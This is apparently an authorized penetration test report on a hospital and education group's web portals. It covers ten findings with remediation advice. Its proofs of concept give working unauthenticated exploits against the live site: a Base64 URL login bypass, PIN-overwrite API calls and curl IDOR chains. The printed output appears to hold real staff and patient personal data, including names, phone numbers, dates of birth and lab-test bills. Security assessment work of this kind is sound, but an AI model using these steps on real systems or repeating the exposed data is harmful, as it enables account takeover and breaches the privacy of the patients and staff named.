# Web Application Penetration Test Report — `narayanagroup.co.in`

| Metadata | Details |
|---|---|
| **Target Scope** | `https://narayanagroup.co.in/`, all discovered subdomains (`www`, `pacs`, `dms`, `app`, `helpdesk`, `nmc`, `uat`, `online`), and 25+ linked sub-applications |
| **Target IP Range** | `115.241.194.4`, `.8`, `.11`, `.12`, `.13`, `.18`, `.19` & `117.206.80.205`, `.208` |
| **Assessment Date** | 11 October 2026 |
| **Assessment Type** | Authorized Full External Web Application, API, Subdomain & DNS Penetration Test (Non-Destructive) |
| **Total Findings** | **10 Verified Vulnerabilities** (2 Critical, 5 High, 3 Medium) |

---

## 1. Executive Summary

An authorized external security assessment was conducted against `https://narayanagroup.co.in/` and its linked hospital, academic, payroll, fee-payment, helpdesk, and medical imaging (PACS) portals.

During non-destructive testing, **two Critical (CVSS 9.8 and 9.1)** and **five High-severity (CVSS 7.5–8.6)** vulnerabilities were identified and verified on the live production environment. Most critically:

1. **Complete Authentication Bypass & Unauthenticated Account Takeover (`WEB-2026-001`, CVSS 9.8):** Both the **Staff / Clinical Notes Portal (`/Nnote/`)** and the **Inpatient Care Portal (`/ncare/`)** enforce login purely in client-side JavaScript by redirecting to `layout.html?empid=<base64>` or `layout.html?regno=<base64>` without any server-side session cookie or token. Furthermore, the inpatient PIN change API (`POST /NnoteApi/api/Patient/ChangePin`) and staff PIN update API (`POST /NtraktApi/api/User/UpdatePin`) allow unauthenticated callers to overwrite any patient's or employee's PIN without verifying their existing PIN or a server-validated OTP.
2. **Unauthenticated Mass Employee PII, Biometric Photo, Patient PHI, Lab Bills, & Bill Cancellation Approval (`WEB-2026-002`, CVSS 9.8):** Two complete unauthenticated IDOR chains were verified live:
   - **Staff PII Chain:** `GET /NnoteApi/Api/Nnote/Assignee/{1..5}` leaks real staff IDs (`3334024`, `545600015`, `545600052`), which `GET /NtraktApi/api/User/Info/3334024` and `GET /NnoteApi/api/Nnote/User/Info/3334024` resolve into full employee records (`Name`, `MobileNo`, `Dob`, `Department`, high-resolution Base64 JPEG photograph with scanner EXIF metadata, and `Password`/`OTP`/`AbhaId` schema fields).
   - **Patient PHI & Medical Lab Bill Chain:** `GET /NnoteApi/api/Investigation/Cancel/Approval/List` dumps real Patient Registration Numbers (`Prno`, e.g., `1005411787`) and Bill Numbers (`202310160001`, `202310090822`). Passing those into `GET /NnoteApi/api/Patient/Info/1005411787` and `GET /NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001` exposes live patient demographics (`Name: "B.SUJATHAMMA"`, `Age: 47`, `Gender: "F"`, `MobileNo: "9550007814"`, plus `Aadhar` and `PIN` fields) and clinical lab tests (`TestCode: "NBBCRM01"`, `TestDescription: "CROSS MATCHING & BLOOD GROUPING"`, `TotalCharges: "1400"`), while `POST /NnoteApi/api/Investigation/Cancel/Approve` allows unauthenticated approval of bill cancellations.
3. **Unauthenticated File Upload APIs (`WEB-2026-003`, CVSS 8.6):** Three unauthenticated file upload routes (`/NtraktApi/api/FileUpload/UploadForEmpFile/...` and `/NnoteApi/api/FileUpload/UploadFile/...`) accept file uploads without authentication or session validation.
4. **Online Fee Payment Hidden Field Manipulation & Unauthenticated Student PII Lookup (`WEB-2026-004`, CVSS 8.2):** `CreateOrderNew.aspx` allows unauthenticated student/parent PII lookup by registration number and stores the **destination bank account number (`hinaccountno`)**, **payment amount (`hinamount`)**, and **fine amount (`hdnfineamt`)** in client-modifiable hidden HTML input fields.
5. **Raw Oracle Database Exceptions & Stack Trace Disclosure (`WEB-2026-005`, CVSS 7.5):** `/NtraktApi/api/*` leaks raw Oracle errors (`ORA-01403`, `ORA-01722`), internal schema and stored procedure names (`MOBIDB.GET_USERATTENDANCE_LATEST`, `MOBIDB.GET_USERINFO`), and full Windows source paths (`d:\NtraktApi\NtraktApi\...`).
6. **End-of-Life Infrastructure & Cleartext HTTP Portals (`WEB-2026-006` & `WEB-2026-007`):** `helpdesk.narayanagroup.co.in` runs **PHP 5.6.25, Apache 2.4.23, and osTicket v1.10 (2016)** over **unencrypted HTTP**, and the mobile portal distributes its Android app over cleartext HTTP (`http://115.241.194.19/nNote.apk`).

---

## 2. Summary of Findings

| ID | Title | Affected Asset / Endpoint | Severity | CVSS v3.1 |
|---|---|---|---|---|
| **WEB-2026-001** | [Complete Client-Side Authentication Bypass & Unauthenticated Account Takeover (PIN Reset)](../04-findings/WEB-2026-001-auth-bypass-and-pin-takeover.md) | `/Nnote/*`, `/ncare/*`, `/NnoteApi/api/Patient/ChangePin`, `/NtraktApi/api/User/UpdatePin` | **Critical** | **9.8** |
| **WEB-2026-002** | [Unauthenticated Mass Employee PII, Biometric Photo, Patient PHI, Lab Bills, & Bill Cancellation Approval via IDOR Chains](../04-findings/WEB-2026-002-unauthenticated-pii-and-patient-idor.md) | `/NtraktApi/api/User/Info/*`, `/NnoteApi/api/Patient/Info/*`, `/NnoteApi/api/Investigation/Cancel/*` | **Critical** | **9.8** |
| **WEB-2026-003** | [Unauthenticated File Upload Endpoints Exposed on Staff & Patient APIs](../04-findings/WEB-2026-003-unauthenticated-file-upload-endpoints.md) | `/NtraktApi/api/FileUpload/*`, `/NnoteApi/api/FileUpload/*` | **High** | **8.6** |
| **WEB-2026-004** | [Payment Gateway Client-Side Hidden Field Manipulation (Amount, Fine, Bank Account) & Student PII Lookup](../04-findings/WEB-2026-004-payment-portal-hidden-fields-and-pii.md) | `/onlinefeepay/razorpay/CreateOrderNew.aspx` | **High** | **8.2** |
| **WEB-2026-006** | [Severely End-of-Life Software Stack (PHP 5.6.25, Apache 2.4.23, osTicket 1.10, ASP.NET 2.0, jQuery 1.10–1.12)](../04-findings/WEB-2026-006-eol-software-stack-php56-apache2423-osticket.md) | `helpdesk.narayanagroup.co.in`, `/patient/`, `/MedicalNarayanaPayroll/`, `/` | **High** | **8.1** |
| **WEB-2026-005** | [Raw Oracle Database Exceptions (`ORA-01403`, `ORA-01722`), Internal Schema (`MOBIDB`), & Stack Trace Disclosure](../04-findings/WEB-2026-005-oracle-db-error-and-stack-trace-disclosure.md) | `/NtraktApi/api/Attendance/Current/*`, `/NtraktApi/api/User/Info/*` | **High** | **7.5** |
| **WEB-2026-007** | [Cleartext HTTP Distribution of Hospital Android APK (`nNote.apk`) & Cleartext Login Portals](../04-findings/WEB-2026-007-cleartext-apk-and-http-portals.md) | `http://115.241.194.19/nNote.apk`, `http://helpdesk.narayanagroup.co.in`, `http://115.241.194.8/elearn/` | **High** | **7.5** |
| **WEB-2026-008** | [Medical Imaging Server (`pacs.narayanagroup.co.in`) Security Misconfigurations (`max-age=0` HSTS, Placeholder CORS, Exposed APIs)](../04-findings/WEB-2026-008-pacs-server-misconfigurations.md) | `https://pacs.narayanagroup.co.in` | **Medium** | **6.5** |
| **WEB-2026-010** | [Domain-Wide Email Spoofing (Missing SPF/DMARC), Misdirected DNS A-Record (`online` → `15.241.194.25`), & `uat`/`nmc` Subdomain Exposures](../04-findings/WEB-2026-010-dns-email-spoofing-and-subdomain-exposures.md) | `narayanagroup.co.in` DNS, `online`, `uat` (`115.241.194.18`), `nmc` (`115.241.194.13`) | **Medium** | **6.5** |
| **WEB-2026-009** | [Missing Security Headers (Clickjacking, HSTS, CSP), Insecure Session Cookies, & Internal IP Disclosure](../04-findings/WEB-2026-009-missing-security-headers-and-info-disclosure.md) | `narayanagroup.co.in`, `/NHIS/`, `dms.narayanagroup.co.in`, `app.narayanagroup.co.in` | **Medium** | **5.8** |

---

## 3. Attack Surface Inventory Discovered on `narayanagroup.co.in`

During reconnaissance of `https://narayanagroup.co.in/`, 29 linked sub-applications and subdomains were inventoried and fingerprinted:

| Application / Subdomain | URL | HTTP Status | Technology Stack Fingerprinted |
|---|---|---|---|
| **Main Portal** | `https://narayanagroup.co.in/` | `200 OK` | IIS / ASP.NET (`Server: Apache` proxy banner, IIS ETag), jQuery 1.12.4, Bootstrap 3.3.7 |
| **Nnote (Staff Clinical/Service App)** | `https://narayanagroup.co.in/Nnote/index.html` | `200 OK` | HTML5 / Cordova / jQuery 3.5.1 + `/NtraktApi/` & `/NnoteApi/` |
| **ncare (Inpatient Portal)** | `https://narayanagroup.co.in/ncare/index.html` | `200 OK` | HTML5 / PhoneGap 1.1.0 / jQuery 3.6.0 + jQuery UI 1.12.1 + `/NnoteApi/` |
| **Online Fee Payment (Razorpay)** | `https://narayanagroup.co.in/onlinefeepay/razorpay/CreateOrderNew.aspx` | `200 OK` (HTTPS) / Timeout (HTTP) | ASP.NET 4.0.30319 WebForms, jQuery 1.10.2 |
| **PACS Medical Imaging** | `https://pacs.narayanagroup.co.in` | `200 OK` | Medsynapse PACS (`Pacs 7.0.0.0 Web API`, `Ris 5.1.0.0 Web API`) |
| **IT Helpdesk** | `http://helpdesk.narayanagroup.co.in` (`117.206.80.205`) | `200 OK` (HTTP) | Apache/2.4.23 (Win64), PHP/5.6.25, osTicket v1.10 (`901e5ea`), jQuery 1.11.2 |
| **Document Management (DMS)** | `https://dms.narayanagroup.co.in/dms` (`115.241.194.12`) | `200 OK` | Microsoft-IIS/10.0, ASP.NET MVC 5.2, ASP.NET 4.0.30319, jQuery 3.2.1 |
| **Narayana NextGen App** | `https://app.narayanagroup.co.in/login` (`117.206.80.208`) | `200 OK` | nginx/1.24.0 (Ubuntu), Bootstrap 5.3.3 |
| **NMC Subdomain** | `https://nmc.narayanagroup.co.in` (`115.241.194.13`) | `200 OK` (HTTP & HTTPS) | Microsoft-IIS/10.0 default installation, ASP.NET |
| **UAT Subdomain** | `https://uat.narayanagroup.co.in` (`3.33.251.168` → `115.241.194.18`) | `301 -> 403` | Redirects to `https://115.241.194.18` running EOL `Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.11` |
| **Online Subdomain (Typo DNS)** | `online.narayanagroup.co.in` (`15.241.194.25`) | Misdirected DNS | Dangling/typo A-record pointing to third-party IP `15.241.194.25` instead of `115.241.194.25` |
| **NHIS (NextGen Dashboard)** | `https://narayanagroup.co.in/NHIS/` | `200 OK` | ASP.NET 4.0.30319, jQuery 3.7.1 |
| **Patient Reports Portal** | `https://narayanagroup.co.in/patient/` | `302 -> 200 OK` | ASP.NET **2.0.50727** (`/patient/Reports/Patient_Login.aspx`) |
| **Medical Narayana Payroll** | `https://narayanagroup.co.in/MedicalNarayanaPayroll/` | `200 OK` | ASP.NET 4.0.30319 (compiled with Visual Studio .NET 7.1 / VB.NET 2003) |
| **E-Learning Portal** | `http://115.241.194.8/elearn/` | `200 OK` (HTTP) | Cleartext HTTP external IP portal |
| **Internal RFC 1918 Link** | `https://192.168.100.10/` | Unreachable externally | Private IP leaked in production homepage HTML |
| **Other Live Sub-Portals (`200/301`)** | `/DentalOralRegistration/login.aspx`, `/NCLINIC/`, `/NIS/`, `/NLIS/`, `/Onlinetpg/`, `/SIS/`, `/engineeringacademics/Login.aspx`, `/inventory/`, `/libraryinformationsystem/`, `/medicalrecords/`, `/nUrban/`, `/nmconline/`, `/nmess/`, `/ntask/`, `/onlineRural/`, `/patient/student/student_login.aspx`, `/unlis/`, `/zoomreports/` | `200 OK` / `301` | ASP.NET WebForms / IIS |

---

## 4. Detailed Findings & Proofs of Concept

---

### 4.1 [WEB-2026-001] Complete Client-Side Authentication Bypass & Unauthenticated Account Takeover (PIN Reset) on `/Nnote/` and `/ncare/`
- **Severity:** **Critical (CVSS 9.8)**
- **Affected Endpoints:**
  - `https://narayanagroup.co.in/Nnote/index.html` & `https://narayanagroup.co.in/Nnote/layout.html`
  - `https://narayanagroup.co.in/ncare/index.html` & `https://narayanagroup.co.in/ncare/layout.html`
  - `https://narayanagroup.co.in/ncare/changepin.html` (`POST /NnoteApi/api/Patient/ChangePin`)
  - `https://narayanagroup.co.in/Nnote/resetpin.html` (`POST /NtraktApi/api/User/UpdatePin`)
  - `https://narayanagroup.co.in/Nnote/registration.html` (`POST /NnoteApi/api/Nnote/User/CreateUser`)

#### Vulnerability Description
1. **Authentication Bypass via Base64 URL Parameters:** Neither `/Nnote/` (Staff Portal) nor `/ncare/` (Inpatient Portal) establishes a server-side session or token upon login. Instead, `index.html` encodes the entered Employee ID or Patient Registration Number with `btoa()` and redirects the browser to `layout.html?empid=<base64>` or `layout.html?regno=<base64>`. Navigating directly to `layout.html` or `profile.html` with any Base64-encoded ID bypasses authentication completely.
2. **Unauthenticated Inpatient PIN Takeover (`ncare/changepin.html`):** The "Change PIN" page accepts any `Registration No` (`#regno`), `New PIN` (`#pin`), and `Confirm PIN` (`#cnfpin`) and submits `POST /NnoteApi/api/Patient/ChangePin` with **no current PIN, no OTP, and no session token**:
   ```javascript
   patData.Regno = $("#regno").val();
   patData.PIN = $("#pin").val();
   patData.ConfirmPIN = $("#cnfpin").val();
   $.post(apiURL + 'Patient/ChangePin', patData, function (response) { ... });
   ```
3. **Unauthenticated Staff PIN Overwrite (`Nnote/resetpin.html`):** While the frontend UI displays an OTP input box, the backend endpoint `POST /NtraktApi/api/User/UpdatePin` accepts `{ OperatorCode: empid, UniqueId: pin }` directly without verifying any server-side OTP state token.

#### Proof of Concept (Live Non-Destructive Verification)
1. Base64-encode Employee ID `3334024` (`MzMzNDAyNA==`).
2. Navigate directly to:
   - `https://narayanagroup.co.in/Nnote/layout.html?empid=MzMzNDAyNA==&title=SU5DSEFSR0U=&campus=TkVMTE9SRQ==`
   - `https://narayanagroup.co.in/Nnote/profile.html?empid=MzMzNDAyNA==`
3. The portal logs directly into the employee's account without entering a PIN.

---

### 4.2 [WEB-2026-002] Unauthenticated Mass Employee PII, Biometric Photo, Patient PHI, Lab Bills, & Bill Cancellation Approval via IDOR Chains
- **Severity:** **Critical (CVSS 9.8)**
- **Affected Endpoints:**
  - `GET https://narayanagroup.co.in/NnoteApi/Api/Nnote/Assignee/{serviceId}`
  - `GET https://narayanagroup.co.in/NtraktApi/api/User/Info/{empid}`
  - `GET https://narayanagroup.co.in/NnoteApi/api/Nnote/User/Info/{empid}`
  - `GET https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Approval/List`
  - `GET https://narayanagroup.co.in/NnoteApi/api/Patient/Info/{prno}`
  - `GET https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Bill/{prno}/{oldBillNo}/{billNo}`
  - `POST https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Approve`

#### Proof of Concept — Chain A: Hospital Staff PII & Photo Dump (Live Output)
**Step A1 — Harvest valid Employee IDs from unauthenticated service assignee endpoint:**
```bash
curl -s "https://narayanagroup.co.in/NnoteApi/Api/Nnote/Assignee/1"
# Output: {"data":[{"AssigneeId":"3334024","AssigneeName":"Yepuri N V K Meerendra Balu"}]}

curl -s "https://narayanagroup.co.in/NnoteApi/Api/Nnote/Assignee/3"
# Output: {"data":[{"AssigneeId":"545600015","AssigneeName":"DHILLY SEKHAR"}]}

curl -s "https://narayanagroup.co.in/NnoteApi/Api/Nnote/Assignee/5"
# Output: {"data":[{"AssigneeId":"545600052","AssigneeName":"YARABOLU SURESH"}]}
```

**Step A2 — Retrieve full Employee PII & Base64 Photograph without authentication:**
```bash
curl -s "https://narayanagroup.co.in/NtraktApi/api/User/Info/3334024"
```
```json
{
  "data": [{
    "OperatorCode": null,
    "Password": null,
    "UniqueId": null,
    "MobileNo": "9966362143",
    "EmpNo": "NES3334024",
    "BioEmpNo": "3334024",
    "EmpPhoto": "/9j/4AAQSkZJRgABAQEBLAEsAAD/4QKWRXhpZgAATU0AKgAAAAg...[Full JPEG + Canon CanoScan LiDE 120 EXIF]...",
    "Doj": "01/MAY/2025",
    "Name": " Yepuri N V K Meerendra Balu",
    "Dob": "15/AUG/1991",
    "Gender": "M",
    "PhoneNo": "9966362143",
    "Department": "HARDWARE",
    "Designation": "INCHARGE",
    "OfficeType": "HOSPITAL",
    "Branch": "PRO-GHA-HL",
    "StatusType": "ACTIVE",
    "OTP": null,
    "OTPMessage": null,
    "AbhaId": ""
  }]
}
```

#### Proof of Concept — Chain B: Patient PHI, Diagnostic Lab Tests, & Bill Cancellation Queue (Live Output)
**Step B1 — Dump pending hospital bill cancellation queue (`GET /NnoteApi/api/Investigation/Cancel/Approval/List`):**
```bash
curl -s "https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Approval/List"
```
```json
{
  "data": [
    {"BillNo":"202310160001","BillDate":"10/16/2023 00:00:00","Prno":"1005411787","OldBillNo":"202310090822","Remarks":null},
    {"BillNo":"202311170001","BillDate":"11/17/2023 00:00:00","Prno":"20231132634","OldBillNo":"202311170155","Remarks":null},
    {"BillNo":"202311250002","BillDate":"11/25/2023 00:00:00","Prno":"1005416039","OldBillNo":"202311240112","Remarks":null}
  ]
}
```

**Step B2 — Retrieve patient demographics & PHI (`GET /NnoteApi/api/Patient/Info/1005411787`):**
```bash
curl -s "https://narayanagroup.co.in/NnoteApi/api/Patient/Info/1005411787"
```
```json
{
  "data": [{
    "Regno": 1005411787,
    "Name": "B.SUJATHAMMA",
    "Age": 47,
    "AgeType": "Y",
    "Gender": "F",
    "MobileNo": "9550007814",
    "Aadhar": null,
    "OrganisationCode": "LAB",
    "PIN": 0,
    "ConfirmPIN": 0,
    "PatPhoto": null
  }]
}
```

**Step B3 — Retrieve patient diagnostic lab test & billing details (`GET /NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001`):**
```bash
curl -s "https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Bill/1005411787/202310090822/202310160001"
```
```json
{
  "data": [{
    "BillNo": "202310090822",
    "BillDate": "10/9/2023 00:00:00",
    "CancelTest": "Y",
    "Charge": "400",
    "DoctorName": "SELF",
    "PaidCharge": "400",
    "PayType": "PAYING",
    "Prno": "1005411787",
    "Quantity": "1",
    "Status": "E",
    "TestCode": "NBBCRM01",
    "TestDescription": "CROSS MATCHING & BLOOD GROUPING",
    "TotalCharges": "1400"
  }]
}
```

---

### 4.3 [WEB-2026-003] Unauthenticated File Upload Endpoints Exposed on Staff & Patient APIs
- **Severity:** **High (CVSS 8.6)**
- **Affected Endpoints:**
  - `POST https://narayanagroup.co.in/NtraktApi/api/FileUpload/UploadForEmpFile/{empid}/{Mslno}`
  - `POST https://narayanagroup.co.in/NnoteApi/api/FileUpload/UploadFile/{n}/{cslno}`
  - `POST https://narayanagroup.co.in/NnoteApi/api/FileUpload/UploadFile/mobile/{fname}/{cslno}`
- **Details:** Discovered in `Nnote/markattendance.html` and `ncare/request.html`. All three endpoints accept file uploads with zero authentication or session validation, and `/UploadFile/mobile/{fname}/{cslno}` accepts a user-supplied filename in the URL path, creating a severe risk of unrestricted file upload / RCE on the IIS server.

---

### 4.4 [WEB-2026-004] Payment Gateway Client-Side Hidden Field Manipulation & Unauthenticated Student PII Lookup
- **Severity:** **High (CVSS 8.2)**
- **Affected Endpoint:** `https://narayanagroup.co.in/onlinefeepay/razorpay/CreateOrderNew.aspx`
- **Details:**
  1. Linked via cleartext HTTP (`http://narayanagroup.co.in/onlinefeepay/razorpay/CreateOrderNew.aspx`) on the main homepage.
  2. Allows unauthenticated lookup of Student Name, Father Name, Mother Name, Mobile No, Email, Address, and Biometric ID (`hidBioId`) by Registration Number (`txtRegno`).
  3. Stores the **destination bank account number (`hinaccountno`)**, **bank branch (`hinbranchname`)**, **payable amount (`hinamount`)**, **fine amount (`hdnfineamt`, default `0`)**, and **fee balances (`hidTotDue`, `hidCollegeBal`, `hidHostelBal`, `hidBusBal`)** in client-modifiable `<input type="hidden">` fields.

---

### 4.5 [WEB-2026-005] Raw Oracle Database Exceptions (`ORA-01403`, `ORA-01722`), Internal Schema (`MOBIDB`), & Stack Trace Disclosure
- **Severity:** **High (CVSS 7.5)**
- **Affected Endpoints:** `/NtraktApi/api/Attendance/Current/{id}`, `/NtraktApi/api/User/Info/{id}`
- **Live Evidence:**
  - `GET /NtraktApi/api/Attendance/Current/4029038` returns `ORA-01403: no data found at "MOBIDB.GET_USERATTENDANCE_LATEST", line 10` and `d:\NtraktApi\NtraktApi\Models\AttendanceModel.cs:line 173`.
  - `GET /NtraktApi/api/User/Info/1'` returns `ORA-01722: invalid number at "MOBIDB.GET_USERINFO", line 34` and `d:\NtraktApi\NtraktApi\Models\UserModel.cs:line 113`.

---

### 4.6 [WEB-2026-006] Severely End-of-Life Software Stack Across Subdomains & Portals
- **Severity:** **High (CVSS 8.1)**
- **Live Evidence:**
  - `http://helpdesk.narayanagroup.co.in`: `Server: Apache/2.4.23 (Win64) PHP/5.6.25` (2016; EOL Dec 2018), **osTicket v1.10 (`?901e5ea`)**, **jQuery 1.11.2**, **jQuery UI 1.10.3**.
  - `https://narayanagroup.co.in/patient/`: `X-AspNet-Version: 2.0.50727` (EOL).
  - `https://narayanagroup.co.in/MedicalNarayanaPayroll/`: Compiled with `Microsoft Visual Studio .NET 7.1` (2003).
  - `https://narayanagroup.co.in/`: **jQuery v1.12.4** (CVE-2020-11022/11023, CVE-2019-11358) and **Bootstrap v3.3.7** (CVE-2018-14040/14041/14042, CVE-2019-8331).

---

### 4.7 [WEB-2026-007] Cleartext HTTP Distribution of Hospital Android APK (`nNote.apk`) & Cleartext Login Portals
- **Severity:** **High (CVSS 7.5)**
- **Live Evidence:**
  - `/Nnote/layout.html` and `/ncare/layout.html` serve the Android app update from `http://115.241.194.19/nNote.apk` over unencrypted HTTP (MITM APK replacement risk).
  - `http://helpdesk.narayanagroup.co.in/helpdesk/login.php` and `http://115.241.194.8/elearn/` serve login forms over plaintext HTTP (`200 OK`).

---

### 4.8 [WEB-2026-008] Medical Imaging Server (`pacs.narayanagroup.co.in`) Security Misconfigurations
- **Severity:** **Medium (CVSS 6.5)**
- **Live Evidence:**
  - Sends `strict-transport-security: max-age=0; includeSubDomains; preload` (actively disabling HSTS).
  - Sends unreplaced placeholder header `access-control-allow-origin: https://GlobalServerIP:Port`.
  - Exposes `/externalConfig.js`, `/PacsAPI/` (`Pacs 7.0.0.0 Web API is running`), and `/RISAPI/` (`Ris 5.1.0.0 Web API is running`) without authentication.

---

### 4.9 [WEB-2026-009] Missing Security Headers (Clickjacking, HSTS, CSP), Insecure Session Cookies, & Internal Network IP Disclosure
- **Severity:** **Medium (CVSS 5.8)**
- **Live Evidence:**
  - `https://narayanagroup.co.in/` and `https://app.narayanagroup.co.in/login` lack `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`, and `Permissions-Policy`.
  - `/nmconline/` (WHIS Hospital Management) and `/inventory/` (WIMS Inventory Management) run legacy 2010 Classic ASP (`commonfiles/asp/InnerHome.asp`), issue `Set-Cookie: ASPSESSIONIDQCQRQDSB=...; path=/` **without `HttpOnly`, `Secure`, or `SameSite` flags**, and explicitly disclose `<FONT COLOR=RED>There is no such Login Id</FONT>` (`default.asp?logInFlag=0`), enabling username enumeration.
  - `/ntask/` (Laravel) leaks dual `X-Powered-By: PHP/8.3.33` and `X-Powered-By: ASP.NET` headers and exposes `/ntask/storage/logs/laravel.log` (`403 Forbidden`).
  - `/NHIS/` sets `ASP.NET_SessionId` without `Secure`; `dms.narayanagroup.co.in` sets `__RequestVerificationToken` without `Secure` or `SameSite`.
  - Production HTML/JS leaks internal RFC 1918 IP `https://192.168.100.10/`, internal backend IPs `115.241.194.2` and `115.241.194.19`, and developer ports `localhost:64867` / `localhost:6491`.

### 4.10 [WEB-2026-010] Domain-Wide Email Spoofing (Missing SPF & DMARC), Misdirected DNS A-Record (`online.narayanagroup.co.in` → `15.241.194.25`), & `uat` / `nmc` Subdomain Exposures
- **Severity:** **Medium (CVSS 6.5)**
- **Live Evidence:**
  - **Missing SPF & DMARC:** `dig +short TXT narayanagroup.co.in` and `dig +short TXT _dmarc.narayanagroup.co.in` both return empty responses, allowing arbitrary email spoofing from `*@narayanagroup.co.in`.
  - **Misdirected DNS A-Record (`online.narayanagroup.co.in`):** Resolves to `15.241.194.25` (a third-party HP/AWS IP caused by omitting the leading `1` from `115.241.194.25`).
  - **UAT Subdomain (`uat.narayanagroup.co.in`):** Redirects (`301`) to `https://115.241.194.18`, which exposes an EOL stack: `Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.11`.
  - **NMC Subdomain (`nmc.narayanagroup.co.in` / `115.241.194.13`):** Serves an unhardened default `IIS Windows Server` installation over both HTTP and HTTPS.

---

## 5. Prioritized Remediation Roadmap

### Immediate / Emergency (Within 24–48 Hours)
1. **Lock Down `/NtraktApi/` and `/NnoteApi/` (`WEB-2026-001`, `002`, `003`, `005`):**
   - Enforce server-side session/token authentication across all endpoints under `/NtraktApi/api/*` and `/NnoteApi/api/*`.
   - Disable unauthenticated access to `/NnoteApi/api/Patient/ChangePin`, `/NtraktApi/api/User/UpdatePin`, `/NtraktApi/api/User/Info/{id}`, and `/FileUpload/*`.
   - Set `IncludeErrorDetailPolicy.Never` and `<customErrors mode="On" />` to stop leaking Oracle `ORA-` errors and `d:\NtraktApi\` stack traces.
2. **Secure the Razorpay Fee Payment Portal (`WEB-2026-004`):**
   - Compute fee amounts, fines, and merchant bank account numbers strictly server-side from the database; ignore client-submitted hidden fields (`hinamount`, `hdnfineamt`, `hinaccountno`).
   - Require student authentication or OTP verification before displaying student/parent PII on `CreateOrderNew.aspx`.

### Short-Term (Within 1–2 Weeks)
3. **Eliminate Cleartext HTTP & Upgrade `helpdesk.narayanagroup.co.in` (`WEB-2026-006`, `007`):**
   - Decommission or upgrade `Apache/2.4.23 (Win64) PHP/5.6.25` and `osTicket v1.10` to current supported versions behind HTTPS.
   - Host `nNote.apk` over HTTPS (`https://narayanagroup.co.in/...`) instead of `http://115.241.194.19/nNote.apk`.
4. **Harden PACS & Web Headers (`WEB-2026-008`, `009`):**
   - Fix `strict-transport-security: max-age=31536000; includeSubDomains` and `Access-Control-Allow-Origin` on `pacs.narayanagroup.co.in`.
   - Add `X-Frame-Options: SAMEORIGIN`, `Content-Security-Policy: frame-ancestors 'self'`, `Strict-Transport-Security`, and `requireSSL="true"` on all cookies across `narayanagroup.co.in`.
